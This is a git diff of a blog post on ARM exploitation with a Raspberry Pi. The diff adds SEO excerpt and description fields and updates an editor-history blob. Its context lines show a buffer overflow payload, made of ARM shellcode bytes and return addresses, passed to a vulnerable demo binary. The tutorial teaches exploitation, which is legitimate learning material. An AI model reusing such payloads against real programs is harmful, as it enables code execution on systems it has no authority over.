@@ -1,6 +1,9 @@
 ---
 layout: single
 title: "ARM Exploitation with Raspberry Pi: Return Back to Program without Crashing"
+excerpt:  "In this blog post, I will introduce you to ARM exploitation with Raspberry Pi and discuss how to return back to a program without crashing. We will be exploring the basics of stack buffer overflow and the techniques to bypass stack protections."  
+seo_title:  "ARM Exploitation with Raspberry Pi: Return Back to Program without Crashing"
+seo_description:  "Learn how to perform ARM exploitation with Raspberry Pi and return back to a program without crashing. This blog post covers the basics of stack buffer overflow and techniques to bypass stack protections. Get started with ARM exploitation today."
 header:
   image: "https://live.staticflickr.com/65535/49799517733_05b4a81f72_h.jpg"
   teaser: "https://live.staticflickr.com/65535/49799517733_05b4a81f72_h.jpg"
@@ -191,8 +194,8 @@ gef> run $(python -c 'print "\x01\x10\xa0\xe1"*20+"\x0c\xb0\x8d\xe2\x04\xe0\x9f\
 ./buf $(python -c 'print "\x01\x10\xa0\xe1"*20+"\x0c\xb0\x8d\xe2\x04\xe0\x9f\xe5\x01\xe4\x4e\xe2\x1e\xff\x2f\xe1"+ "\x1c\x05\x01\x01" + "JUNK"+ "\x7c\xf4\xff\x7e"')
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTIxNDM4ODcxOTEsMTAxMzE4MTg3OCwtNz
-c4NjQ5Mzc0LC0xNDY5MTI3MjM5LDIwNDQwMDc3OTUsMTg5MzA3
-NzM4NCwxMDY0NTgzNDEzLDI5MzE3MjUxLDk2MzQyNzc0NCwxOD
-k1Njc4ODU0LDEyMjUwNTQ2MDFdfQ==
+eyJoaXN0b3J5IjpbLTE5MzcxNzkxNTgsLTIxNDM4ODcxOTEsMT
+AxMzE4MTg3OCwtNzc4NjQ5Mzc0LC0xNDY5MTI3MjM5LDIwNDQw
+MDc3OTUsMTg5MzA3NzM4NCwxMDY0NTgzNDEzLDI5MzE3MjUxLD
+k2MzQyNzc0NCwxODk1Njc4ODU0LDEyMjUwNTQ2MDFdfQ==
 -->
